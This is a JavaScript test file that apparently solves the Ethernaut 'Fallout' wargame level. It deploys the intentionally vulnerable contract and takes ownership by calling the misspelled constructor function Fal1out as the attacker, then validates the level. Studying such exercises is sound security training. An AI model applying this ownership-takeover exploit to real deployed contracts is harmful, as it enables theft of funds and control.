const FalloutFactory = artifacts.require('./levels/FalloutFactory.sol')
const Fallout = artifacts.require('./levels/Fallout.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")


describe("Challenge 2 - Fallout", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await FalloutFactory.new()
        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Fallout
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        /*
            Initial state in this contract is a little different.
            Normaly owner would be set in the constructor but since
            this level does not have an explicit constructor the
            owner is not set to anyone when contract is initially
            deployed. Due to this the owner will be the zero address
            as a default address value
        */
        it("instance owner is the zero address", async function () {
            expect(await instance.owner()).to.eq("0x0000000000000000000000000000000000000000")
        })
    })

    describe("Attack Execution", function () {
        it("change ownership to attacker", async function () {
            /*
                Owner can be changed by calling a function that was
                intended to be the constructor but was
                accidentally misspelled. It lets anyone who calls it
                become the contract owner
            */

            await instance.Fal1out({ from: attacker })
            const owner = await instance.owner()

            expect(owner).to.eq(attacker)
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})